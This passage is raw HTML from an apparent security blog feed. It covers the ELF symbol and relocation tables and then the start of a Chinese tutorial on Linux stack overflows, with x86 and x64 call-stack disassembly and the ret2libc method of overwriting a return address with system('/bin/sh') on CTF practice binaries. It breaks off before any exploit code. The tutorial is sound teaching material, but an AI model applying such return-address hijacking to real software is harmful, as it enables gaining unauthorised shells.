Align</span><br><span class="line">  [ 0]                   NULL             0000000000000000  00000000</span><br><span class="line">       0000000000000000  0000000000000000           0     0     0</span><br><span class="line">  [ 1] .interp           PROGBITS         0000000000000318  00000318</span><br><span class="line">       000000000000001c  0000000000000000   A       0     0     1</span><br><span class="line">  [ 2] .note.gnu.propert NOTE             0000000000000338  00000338</span><br><span class="line">       0000000000000020  0000000000000000   A       0     0     8</span><br><span class="line">  [ 3] .note.gnu.build-i NOTE             0000000000000358  00000358</span><br><span class="line">       0000000000000024  0000000000000000   A       0     0     4</span><br><span class="line">  [ 4] .note.ABI-tag     NOTE             000000000000037c  0000037c</span><br><span class="line">       0000000000000020  0000000000000000   A       0     0     4</span><br><span class="line">  [ 5] .gnu.hash         GNU_HASH         00000000000003a0  000003a0</span><br><span class="line">       00000000000002d8  0000000000000000   A       6     0     8</span><br><span class="line">  [ 6] .dynsym           DYNSYM           0000000000000678  00000678</span><br><span class="line">       0000000000001158  0000000000000018   A       7     1     8</span><br><span class="line">  [ 7] .dynstr           STRTAB           00000000000017d0  000017d0</span><br><span class="line">       00000000000006b6  0000000000000000   A       0     0     1</span><br><span class="line">  [ 8] .gnu.version      VERSYM           0000000000001e86  00001e86</span><br><span class="line">       0000000000000172  0000000000000002   A       6     0     2</span><br><span class="line">  [ 9] .gnu.version_r    VERNEED          0000000000001ff8  00001ff8</span><br><span class="line">       0000000000000070  0000000000000000   A       7     1     8</span><br><span class="line">  [10] .rela.dyn         RELA             0000000000002068  00002068</span><br><span class="line">       0000000000001b00  0000000000000018   A       6     0     8</span><br><span class="line">  [11] .rela.plt         RELA             0000000000003b68  00003b68</span><br><span class="line">       00000000000007f8  0000000000000018  AI       6    25     8</span><br><span class="line">  [12] .init             PROGBITS         0000000000005000  00005000</span><br><span class="line">       000000000000001b  0000000000000000  AX       0     0     4</span><br><span class="line">  [13] .plt              PROGBITS         0000000000005020  00005020</span><br><span class="line">       0000000000000560  0000000000000010  AX       0     0     16</span><br><span class="line">  [14] .plt.got          PROGBITS         0000000000005580  00005580</span><br><span class="line">       0000000000000020  0000000000000010  AX       0     0     16</span><br><span class="line">  [15] .plt.sec          PROGBITS         00000000000055a0  000055a0</span><br><span class="line">       0000000000000550  0000000000000010  AX       0     0     16</span><br><span class="line">  [16] .text             PROGBITS         0000000000005af0  00005af0</span><br><span class="line">       0000000000011cf5  0000000000000000  AX       0     0     16</span><br><span class="line">  [17] .fini             PROGBITS         00000000000177e8  000177e8</span><br><span class="line">       000000000000000d  0000000000000000  AX       0     0     4</span><br><span class="line">  [18] .rodata           PROGBITS         0000000000018000  00018000</span><br><span class="line">       0000000000001f42  0000000000000000   A       0     0     32</span><br><span class="line">  [19] .eh_frame_hdr     PROGBITS         0000000000019f44  00019f44</span><br><span class="line">       0000000000000804  0000000000000000   A       0     0     4</span><br><span class="line">  [20] .eh_frame         PROGBITS         000000000001a748  0001a748</span><br><span class="line">       00000000000031a8  0000000000000000   A       0     0     8</span><br><span class="line">  [21] .init_array       INIT_ARRAY       000000000001ef30  0001df30</span><br><span class="line">       0000000000000008  0000000000000008  WA       0     0     8</span><br><span class="line">  [22] .fini_array       FINI_ARRAY       000000000001ef38  0001df38</span><br><span class="line">       0000000000000008  0000000000000008  WA       0     0     8</span><br><span class="line">  [23] .data.rel.ro      PROGBITS         000000000001ef40  0001df40</span><br><span class="line">       0000000000000bc8  0000000000000000  WA       0     0     32</span><br><span class="line">  [24] .dynamic          DYNAMIC          000000000001fb08  0001eb08</span><br><span class="line">       00000000000001f0  0000000000000010  WA       7     0     8</span><br><span class="line">  [25] .got              PROGBITS         000000000001fcf8  0001ecf8</span><br><span class="line">       00000000000002f0  0000000000000008  WA       0     0     8</span><br><span class="line">  [26] .data             PROGBITS         0000000000020000  0001f000</span><br><span class="line">       0000000000000240  0000000000000000  WA       0     0     32</span><br><span class="line">  [27] .bss              NOBITS           0000000000020240  0001f240</span><br><span class="line">       0000000000002c30  0000000000000000  WA       0     0     32</span><br><span class="line">  [28] .gnu_debuglink    PROGBITS         0000000000000000  0001f240</span><br><span class="line">       0000000000000034  0000000000000000           0     0     4</span><br><span class="line">  [29] .shstrtab         STRTAB           0000000000000000  0001f274</span><br><span class="line">       000000000000011d  0000000000000000           0     0     1</span><br><span class="line">Key to Flags:</span><br><span class="line">  W (write), A (alloc), X (execute), M (merge), S (strings), I (info),</span><br><span class="line">  L (link order), O (extra OS processing required), G (group), T (TLS),</span><br><span class="line">  C (compressed), x (unknown), o (OS specific), E (exclude),</span><br><span class="line">  l (large), p (processor specific)</span><br></pre></td></tr></table></figure><h4 id="符号表"><a href="#符号表" class="headerlink" title="符号表"></a>符号表</h4><p>节的分类中我们介绍了<code>.dynsym</code>节和<code>.symtab</code>节，两者都是符号表。那么它们到底有什么区别呢？存在什么关系呢？</p><p><strong>符号是对某些类型的数据或代码（如全局变量或函数）的符号引用，函数名或变量名就是符号名</strong>。例如，<code>printf()</code>函数会在动态链接符号表<code>.dynsym</code>中存有一个指向该函数的符号项（以<code>Elf_Sym</code>数据结构表示）。在大多数共享库和动态链接可执行文件中，存在两个符号表。即<code>.dynsym</code>和<code>.symtab</code>。</p><p><strong><code>.dynsym</code>保存了引用来自外部文件符号的全局符号</strong>。如<code>printf</code>库函数。**<code>.dynsym</code>保存的符号是<code>.symtab</code>所保存符合的子集，<code>.symtab</code>中还保存了可执行文件的本地符号**。如全局变量，代码中定义的本地函数等。</p><p>既然<code>.dynsym</code>是<code>.symtab</code>的子集，那为何要同时存在两个符号表呢？</p><p>通过<code>readelf -S</code>命令可以查看可执行文件的输出，一部分节标志位（<code>sh_flags</code>）被标记为了<strong>A（ALLOC）、WA（WRITE/ALLOC）、AX（ALLOC/EXEC）</strong>。其中，<code>.dynsym</code>被标记为ALLOC，而<code>.symtab</code>则没有标记。</p><p>ALLOC表示有该标记的节会在运行时分配并装载进入内存，而<code>.symtab</code>不是在运行时必需的，因此不会被装载到内存中。**<code>.dynsym</code>保存的符号只能在运行时被解析，因此是运行时动态链接器所需的唯一符号**。<code>.dynsym</code>对于动态链接可执行文件的执行是必需的，而<code>.symtab</code>只是用来进行调试和链接的。</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/ELF/5.png" alt="img"></p><p>上图所示为通过符号表索引字符串表的示意图。符号表中的每一项都是一个<code>Elf_Sym</code>结构，对应可以在字符串表中索引得到一个字符串。该数据结构符号表项的格式如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    Elf32_Word st_name;     <span class="comment">//符号名。该值为该符号名在字符串表中的偏移地址。</span></span><br><span class="line">    Elf32_Addr st_value;    <span class="comment">//符号对应的值。存放符号的值（可能是地址或位置偏移量）。</span></span><br><span class="line">    Elf32_Word st_size;     <span class="comment">//符号的大小。</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> st_info;  <span class="comment">//此成员给出符号的类型和绑定属性。下面给出若干取值和含义的绑定关系</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> st_other; <span class="comment">//符号所在的节</span></span><br><span class="line">    Elf32_Half st_shndx;    <span class="comment">//符号类型及绑定属性</span></span><br><span class="line">&#125; Elf32_sym;</span><br></pre></td></tr></table></figure><h4 id="字符串表"><a href="#字符串表" class="headerlink" title="字符串表"></a>字符串表</h4><p>类似于符号表，在大多数共享库和动态链接可执行文件中，也存在两个字符串表。即<code>.dynstr</code>和<code>.strtab</code>，分别对应于<code>.dynsym</code>和<code>symtab</code>。此外，还有一个<code>.shstrtab</code>的节头字符串表，用于保存节头表中用到的字符串，可通过<code>sh_name</code>进行索引。</p><p>ELF文件中所有字符表的结构基本一致，如上图所示。</p><h4 id="重定位表"><a href="#重定位表" class="headerlink" title="重定位表"></a>重定位表</h4><p><strong>重定位就是将符号定义和符号引用进行连接的过程</strong>。可重定位文件需要包含描述如何修改节内容的相关信息，从而使可执行文件和共享目标文件能够保存进程的程序镜像所需要的正确信息。</p><p>重定位表是进行重定位的重要依据。我们可以使用objdump工具查看目标文件的重定位表：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    Elf32_Addr r_offset;  <span class="comment">//重定位入口的偏移。</span></span><br><span class="line">                          <span class="comment">//对于可重定位文件来说，这个值是该重定位入口所要修正的位置的第一个字节相对于节起始的偏移</span></span><br><span class="line">                          <span class="comment">//对于可执行文件或共享对象文件来说，这个值是该重定位入口所要修正的位置的第一个字节的虚拟地址</span></span><br><span class="line">    Elf32_word r_info;    <span class="comment">//重定位入口的类型和符号</span></span><br><span class="line">                          <span class="comment">//对于可执行文件和共享目标文件来说，它们的重定位入口是动态链接类型的。</span></span><br><span class="line">&#125; Elf32_Rel;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">    Elf32_Addr r_offset;</span><br><span class="line">    Elf32_Word r_info;</span><br><span class="line">    Elf32_Word r_addend;  <span class="comment">//此成员给出一个常量补齐，用来计算将被填充到可重定位字段的数值。</span></span><br><span class="line">&#125; Elf32_Rela;</span><br></pre></td></tr></table></figure><blockquote><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;www.chuquan.me&#x2F;2018&#x2F;05&#x2F;21&#x2F;elf-introduce&#x2F;</span><br><span class="line">https:&#x2F;&#x2F;paper.seebug.org&#x2F;papers&#x2F;Archive&#x2F;refs&#x2F;elf&#x2F;Understanding_ELF.pdf</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
        
        
    <summary type="html"></summary>
        
      
    
    
    
    
  </entry>
  
  <entry>
    <title>Linux栈溢出总结（0x02）</title>
    <link href="https://www.ascotbe.com/2020/11/20/StackOverflow_Linux_0x02/"/>
    <id>https://www.ascotbe.com/2020/11/20/StackOverflow_Linux_0x02/</id>
    <published>2020-11-20T10:45:42.000Z</published>
    <updated>2021-05-17T02:10:09.877Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>声明</p></blockquote><p>郑重声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！</p><blockquote><p>前言</p></blockquote><p>在上篇中介绍了一些常见保护，以及如何开关，还有如何生成shellcode等操作，就那么点东西我搞了一星期，真是菜吐了，心态崩了了</p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/StackOverflow/11.png" alt="222" style="zoom:50%;" /><blockquote><h2 id="写在前面的几个笔记"><a href="#写在前面的几个笔记" class="headerlink" title="写在前面的几个笔记"></a>写在前面的几个笔记</h2></blockquote><blockquote><h4 id="CALL和RET指令解释"><a href="#CALL和RET指令解释" class="headerlink" title="CALL和RET指令解释"></a>CALL和RET指令解释</h4></blockquote><ul><li><strong>CALL</strong>指令调用某个子函数时，下一条指令的地址作为返回地址被保存到栈中。等价于<strong>PUSH</strong>返回地址与<strong>JMP</strong>函数地址的指令序列</li><li><strong>RET</strong>指令跳转到<strong>CALL</strong>指令保存的返回地址，讲控制权交还给调用函数。等价于<strong>POP</strong>返回地址与<strong>JMP</strong>返回地址的指令序列</li></ul><blockquote><h4 id="AMD64和i386的区别"><a href="#AMD64和i386的区别" class="headerlink" title="AMD64和i386的区别"></a>AMD64和i386的区别</h4></blockquote><p>由于后面的利用方式可能会用到64位的程序，所以在前面把两者几个点需要区别下</p><ul><li>首先是内存地址的范围由32位变成了64位。但是可以使用的内存地址不能大于<code>0x00007fffffffffff</code>，否则就会抛出异常。</li><li>其次是函数参数的传递方式发生了改变，x86中参数都是保存在栈上，但在x64中的前六个参数依次保存在<strong>RDI</strong>、<strong>RSI</strong>、<strong>RDX</strong>、<strong>RCX</strong>、 <strong>R8</strong>和<strong>R9</strong>中，如果还有更多的参数的话才会保存在栈上。</li></ul><blockquote><h2 id="函数调用栈"><a href="#函数调用栈" class="headerlink" title="函数调用栈"></a>函数调用栈</h2></blockquote><p>函数调用栈是一块连续的用来保存函数运行状态的内存区域，调用函数（caller）和被调用函数 （callee）根据调用关系堆叠起来，从内存的高地址向低地址增长。</p><p>一个典型的栈帧布局如下所示:</p><ol><li>函数参数</li><li>函数返回地址</li><li>帧指针</li><li>错误处理帧</li><li>局部变量</li><li>栈缓冲区</li><li>被调函数保存的寄存器</li></ol><p>栈帧的布局如下图所示：</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/StackOverflow/24.png" alt="img"></p><p>在windows/Intel平台上，当发生一个函数调用时，数据通过如下的方式存放在栈上：</p><ol><li>在函数调用之前先将函数参数压栈，参数按照从<strong>右</strong>到<strong>左</strong>的顺序。</li><li>由x86的<strong>call</strong>指令将函数的返回地址压栈（<strong>通常为call命令的下一个地址</strong>），这个返回地址就是函数调用结束后<strong>ret</strong>指令放入EIP寄存器的值。</li><li>上一个栈帧的栈帧指针通过EBP的值压栈</li><li>如果函数包含了try/catch或者其他的异常处理结构（如SEH），编译器会在栈上放置异常处理所需要的信息。</li><li>栈上分配局部变量</li><li>为临时数据分配栈缓冲区</li><li>最后，被调函数保存ESI, EDI, EBX寄存器的值。 对于linux/intel平台，这一步在第4步之后</li></ol><blockquote><h4 id="样例"><a href="#样例" class="headerlink" title="样例"></a>样例</h4></blockquote><p>演示代码</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">func</span><span class="params">(<span class="keyword">int</span> arg1, <span class="keyword">int</span> arg2, <span class="keyword">int</span> arg3, <span class="keyword">int</span> arg4, <span class="keyword">int</span> arg5, <span class="keyword">int</span> arg6, <span class="keyword">int</span> arg7, <span class="keyword">int</span> arg8)</span></span></span><br><span class="line"><span class="function"></span>&#123; </span><br><span class="line">    <span class="keyword">int</span> loc1 = arg1 + <span class="number">1</span>; <span class="keyword">int</span> loc8 = arg8 + <span class="number">8</span>; <span class="keyword">return</span> loc1 + loc8; </span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span></span><br><span class="line"><span class="function"></span>&#123; </span><br><span class="line"><span class="keyword">return</span> func(<span class="number">11</span>, <span class="number">22</span>, <span class="number">33</span>, <span class="number">44</span>, <span class="number">55</span>, <span class="number">66</span>, <span class="number">77</span>, <span class="number">88</span>); </span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// gcc -m32 stack.c -o stack32</span></span><br><span class="line"><span class="comment">// gcc stack.c -o stack64</span></span><br></pre></td></tr></table></figure><blockquote><h4 id="栈的分布图"><a href="#栈的分布图" class="headerlink" title="栈的分布图"></a>栈的分布图</h4></blockquote><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/StackOverflow/25.png" alt="image-20210314150418220"></p><blockquote><h4 id="x86"><a href="#x86" class="headerlink" title="x86"></a>x86</h4></blockquote><p>首先，被调用函数 func()的 8 个参数从后向前依次入栈，当执行 call 指令时，下一条指令的地址0x08048415 作为返回地址入栈。然后程序跳转到 func()，在函数开头，将调用函数的 ebp 压栈保存并更新为当前的栈顶地址esp作为新的栈基址，而 esp 则下移为局部变量开辟空间。函数返回时则相反，通过 leave 指令将 esp 恢复为当前的ebp，并从栈中将调用者的 ebp 弹出，最后 ret 指令弹出返回地址作为 eip，程序回到 main()函数中，最后抬高esp 清理被调用者的参数，一次函数调用的过程就结束了。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">#X86中的栈</span><br><span class="line">gef➤ disassemble main 0x080483fd &lt;+0&gt;: push ebp                   # 将栈底 ebp 压栈 (esp -&#x3D; 4) </span><br><span class="line">0x080483fe &lt;+1&gt;: mov ebp,esp                                      # 更新 ebp 为当前栈顶 esp </span><br><span class="line">0x08048400 &lt;+3&gt;: push 0x58                                        # 将 arg8 压栈 (esp -&#x3D; 4) </span><br><span class="line">0x08048402 &lt;+5&gt;: push 0x4d                                        # 将 arg7 压栈 (esp -&#x3D; 4) </span><br><span class="line">0x08048404 &lt;+7&gt;: push 0x42                                        # 将 arg6 压栈 (esp -&#x3D; 4) </span><br><span class="line">0x08048406 &lt;+9&gt;: push 0x37                                        # 将 arg5 压栈 (esp -&#x3D; 4) </span><br><span class="line">0x08048408 &lt;+11&gt;:push 0x2c                                        # 将 arg4 压栈 (esp -&#x3D; 4) </span><br><span class="line">0x0804840a &lt;+13&gt;:push 0x21                                        # 将 arg3 压栈 (esp -&#x3D; 4) </span><br><span class="line">0x0804840c &lt;+15&gt;:push 0x16                                        # 将 arg2 压栈 (esp -&#x3D; 4) </span><br><span class="line">0x0804840e &lt;+17&gt;:push 0xb                                         # 将 arg1 压栈 (esp -&#x3D; 4) </span><br><span class="line">0x08048410 &lt;+19&gt;:call 0x80483db &lt;func&gt;                            # 调用 func (push 0x08048415) </span><br><span class="line">0x08048415 &lt;+24&gt;:add esp,0x20                                     # 恢复栈顶 esp </span><br><span class="line">0x08048418 &lt;+27&gt;:leave                                            # (mov esp, ebp; pop ebp) </span><br><span class="line">0x08048419 &lt;+28&gt;:ret                                              # 函数返回 (pop eip) </span><br><span class="line">gef➤ disassemble func 0x080483db &lt;+0&gt;: push ebp                   # 将栈底 ebp 压栈 (esp -&#x3D; 4) </span><br><span class="line">0x080483dc &lt;+1&gt;: mov ebp,esp                                      # 更新 ebp 为当前栈顶 esp </span><br><span class="line">0x080483de &lt;+3&gt;: sub esp,0x10                                     # 为局部变量开辟栈空间 </span><br><span class="line">0x080483e1 &lt;+6&gt;: mov eax,DWORD PTR [ebp+0x8]                      # 取出 arg1 </span><br><span class="line">0x080483e4 &lt;+9&gt;: add eax,0x1                                      # 计算 loc1 </span><br><span class="line">0x080483e7 &lt;+12&gt;:mov DWORD PTR [ebp-0x8],eax                      # loc1 放入栈 </span><br><span class="line">0x080483ea &lt;+15&gt;:mov eax,DWORD PTR [ebp+0x24]                     # 取出 arg8 </span><br><span class="line">0x080483ed &lt;+18&gt;:add eax,0x8                                      # 计算 loc8 </span><br><span class="line">0x080483f0 &lt;+21&gt;:mov DWORD PTR [ebp-0x4],eax                      # loc8 放入栈 </span><br><span class="line">0x080483f3 &lt;+24&gt;:mov edx,DWORD PTR [ebp-0x8] </span><br><span class="line">0x080483f6 &lt;+27&gt;:mov eax,DWORD PTR [ebp-0x4] </span><br><span class="line">0x080483f9 &lt;+30&gt;:add eax,edx                                      # 计算返回值 </span><br><span class="line">0x080483fb &lt;+32&gt;:leave                                            # (mov esp, ebp; pop ebp) </span><br><span class="line">0x080483fc &lt;+33&gt;:ret                                              # 函数返回 (pop eip)</span><br></pre></td></tr></table></figure><blockquote><p>x86-64</p></blockquote><p>对于 x86-64 的程序，前6 个参数分别通过rdi、rsi、rdx、rcx、r8和r9进行传递，剩余参数才像x86一样从后向前依次压栈。除此之外，我们还发现func()没有下移rsp开辟栈空间的操作，导致rbp和rsp的值是相同的，其实这是一项编译优化：根据AMD64 ABI文档的描述，rsp以下128字节的区域被称为red zone，这是一块被保留的内存，不会被信号或者中断所修改。于是，func()作为叶子函数就可以在不调整栈指针的情况下，使用这块内存保存临时数据。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">gef➤ disassemble main </span><br><span class="line">0x000000000040050a &lt;+0&gt;: push rbp                    # 将栈底 rbp 压栈 (rsp -&#x3D; 8) </span><br><span class="line">0x000000000040050b &lt;+1&gt;: mov rbp,rsp                 # 更新 rbp 为当前栈顶 rsp </span><br><span class="line">0x000000000040050e &lt;+4&gt;: push 0x58                   # 将 arg8 压栈 (rsp -&#x3D; 8) </span><br><span class="line">0x0000000000400510 &lt;+6&gt;: push 0x4d                   # 将 arg7 压栈 (rsp -&#x3D; 8) </span><br><span class="line">0x0000000000400512 &lt;+8&gt;: mov r9d,0x42                # 将 arg6 赋值给 r9 </span><br><span class="line">0x0000000000400518 &lt;+14&gt;: mov r8d,0x37               # 将 arg5 赋值给 r8 </span><br><span class="line">0x000000000040051e &lt;+20&gt;: mov ecx,0x2c               # 将 arg4 赋值给 rcx </span><br><span class="line">0x0000000000400523 &lt;+25&gt;: mov edx,0x21               # 将 arg3 赋值给 rdx </span><br><span class="line">0x0000000000400528 &lt;+30&gt;: mov esi,0x16               # 将 arg2 赋值给 rsi </span><br><span class="line">0x000000000040052d &lt;+35&gt;: mov edi,0xb                # 将 arg1 赋值给 rdi </span><br><span class="line">0x0000000000400532 &lt;+40&gt;: call 0x4004d6 &lt;func&gt;       # 调用 func (push 0x400537) </span><br><span class="line">0x0000000000400537 &lt;+45&gt;: add rsp,0x10               # 恢复栈顶 rsp </span><br><span class="line">0x000000000040053b &lt;+49&gt;: leave                      # (mov rsp, rbp; pop rbp) </span><br><span class="line">0x000000000040053c &lt;+50&gt;: ret                        # 函数返回 (pop rip) </span><br><span class="line">gef➤ disassemble func </span><br><span class="line">0x00000000004004d6 &lt;+0&gt;: push rbp                    # 将栈底 rbp 压栈 (rsp -&#x3D; 8) </span><br><span class="line">0x00000000004004d7 &lt;+1&gt;: mov rbp,rsp                 # 更新 rbp 为当前栈顶 rsp </span><br><span class="line">0x00000000004004da &lt;+4&gt;: mov DWORD PTR [rbp-0x14],edi </span><br><span class="line">0x00000000004004dd &lt;+7&gt;: mov DWORD PTR [rbp-0x18],esi </span><br><span class="line">0x00000000004004e0 &lt;+10&gt;: mov DWORD PTR [rbp-0x1c],edx </span><br><span class="line">0x00000000004004e3 &lt;+13&gt;: mov DWORD PTR [rbp-0x20],ecx </span><br><span class="line">0x00000000004004e6 &lt;+16&gt;: mov DWORD PTR [rbp-0x24],r8d </span><br><span class="line">0x00000000004004ea &lt;+20&gt;: mov DWORD PTR [rbp-0x28],r9d </span><br><span class="line">0x00000000004004ee &lt;+24&gt;: mov eax,DWORD PTR [rbp-0x14] </span><br><span class="line">0x00000000004004f1 &lt;+27&gt;: add eax,0x1 </span><br><span class="line">0x00000000004004f4 &lt;+30&gt;: mov DWORD PTR [rbp-0x8],eax </span><br><span class="line">0x00000000004004f7 &lt;+33&gt;: mov eax,DWORD PTR [rbp+0x18] </span><br><span class="line">0x00000000004004fa &lt;+36&gt;: add eax,0x8 </span><br><span class="line">0x00000000004004fd &lt;+39&gt;: mov DWORD PTR [rbp-0x4],eax </span><br><span class="line">0x0000000000400500 &lt;+42&gt;: mov edx,DWORD PTR [rbp-0x8] </span><br><span class="line">0x0000000000400503 &lt;+45&gt;: mov eax,DWORD PTR [rbp-0x4] </span><br><span class="line">0x0000000000400506 &lt;+48&gt;: add eax,edx                # 计算返回值 </span><br><span class="line">0x0000000000400508 &lt;+50&gt;: pop rbp                    # 恢复 rbp (rsp +&#x3D; 8) </span><br><span class="line">0x0000000000400509 &lt;+51&gt;: ret                        # 函数返回 (pop rip)</span><br></pre></td></tr></table></figure><blockquote><h2 id="绕过NX保护"><a href="#绕过NX保护" class="headerlink" title="绕过NX保护"></a>绕过NX保护</h2></blockquote><h3 id="Ret2libc"><a href="#Ret2libc" class="headerlink" title="Ret2libc"></a>Ret2libc</h3><p>Bypass DEP 通过ret2libc绕过DEP防护，现在我们把DEP打开，依然关闭stack protector和ASLR。这时候我们按上篇无保护的思路来做题的话，系统会拒绝执行我们的shellcode。如果你通过<code>sudo cat /proc/[pid]/maps</code>查看，stack是rw的而不是rwx。</p><p>三道题分布对应下面三个小结</p><ul><li><a href="https://raw.githubusercontent.com/Ascotbe/Random-img/master/StackOverflow/ret2libc1">ret2libc1</a></li><li><a href="https://raw.githubusercontent.com/Ascotbe/Random-img/master/StackOverflow/ret2libc2">ret2libc2</a></li><li><a href="https://raw.githubusercontent.com/Ascotbe/Random-img/master/StackOverflow/ret2libc3">ret2libc3</a></li></ul><h4 id="利用原理"><a href="#利用原理" class="headerlink" title="利用原理"></a>利用原理</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">                            栈  （进入危险函数之前） </span><br><span class="line">&lt;-------------------------------------------------------------&gt;</span><br><span class="line">    ESP &lt;------&gt; EBP         call function             args</span><br><span class="line">|--------------------|-------------|----------------|---------|</span><br><span class="line">|     ..........     | JMP 函数地址  |  PUSH 返回地址  |  value  |</span><br><span class="line">|--------------------|-------------|----------------|---------|</span><br><span class="line">                  利用溢出覆盖返回地址和参数</span><br><span class="line">                  </span><br><span class="line">                             </span><br><span class="line">                             |</span><br><span class="line">                             |</span><br><span class="line">                             |</span><br><span class="line">                             v</span><br><span class="line">                    栈  （进入危险函数之后）</span><br><span class="line"> &lt;-------------------------------------------&gt;</span><br><span class="line">    ESP &lt;------&gt; EBP       EIP        args</span><br><span class="line">|--------------------|-------------|---------|</span><br><span class="line">|     ..........     | return addr |  value  |</span><br><span class="line">|--------------------|-------------|---------|</span><br><span class="line">                  利用溢出覆盖返回地址和参数</span><br><span class="line">                             |</span><br><span class="line">                             |</span><br><span class="line">                             |</span><br><span class="line">                             v</span><br><span class="line">                           </span><br><span class="line">                      栈 （覆盖之后）</span><br><span class="line">&lt;------------------------------------------------------------------------------------------&gt;</span><br><span class="line">        ESP              EBP                           call function               args</span><br><span class="line">|-----------------|-------------|----------------------------|-----------------|-----------|</span><br><span class="line">| AAAAAAAAAAAAAAAAAAAAAAAAAAAAA | JMP (system function addr) | PUSH return addr| &quot;&#x2F;bin&#x2F;sh&quot; |</span><br><span class="line">|-----------------|-------------|----------------------------|-----------------|-----------|</span><br><span class="line"></span><br><span class="line">最终结果：</span><br><span class="line">1.把返回地址的值覆盖为system()函数的地址</span><br><span class="line">2.正常执行栈</span><br><span class="line">3.执行完栈后调用RET汇编指令（POP出system()函数的地址，把EIP指向system()函数的地址）</span><br><span class="line">4.当执行完第三步后，就会构成一个新的栈：参数-&gt;call system函数</span><br><span class="line">5.执行新构建的栈，进而获取控制台权限</span><br></pre></td></tr></table></figure><hr><h4 id="存在system-函数和-bin-sh字符串"><a href="#存在system-函数和-bin-sh字符串" class="headerlink" title="存在system()函数和/bin/sh字符串"></a>存在system()函数和/bin/sh字符串</h4><p>以 bamboofox 中 ret2libc1 为例，首先，我们可以检查一下程序的安全保护</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">kali@kali:~/Desktop$ checksec ret2libc1</span><br><span class="line">[*] <span 